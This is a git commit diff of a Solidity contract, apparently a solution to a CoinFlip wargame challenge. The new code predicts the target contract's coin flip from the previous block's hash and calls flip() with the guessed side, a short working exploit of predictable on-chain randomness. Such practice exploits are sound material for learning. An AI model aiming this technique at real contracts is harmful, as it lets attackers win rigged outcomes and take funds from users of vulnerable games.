36012d028708699f2b13a616a27128aa6f6d40d6
Made in heaven Joestar <madeinheavenjoestar@ict20.ce.kmitl.ac.th>
2024-07-20 02:24:00 +0700

    chore: Refactor CallCoinFlip contract and update import statement

--- src/CoinFlip/CallCoinFlip.sol
+++ src/CoinFlip/CallCoinFlip.sol
@@ -1,16 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import { CoinFlip } from '../CoinFlip';
+import { CoinFlip } from './CoinFlip.sol';
 
-contract callCoinFlip {
-    CoinFlip coinFlip ;
+contract CallCoinFlip {
+    CoinFlip private flipContract;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _address) {
-        coinFlip = CoinFlip(_address);
+        flipContract = CoinFlip(_address);
     }
 
     function byPassWinning() public {
-        coinFlip.consecutiveWins = 10;
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlipResult = blockValue / FACTOR;
+        bool side = coinFlipResult == 1 ? true : false;
+        flipContract.flip(side);   
     }
 }
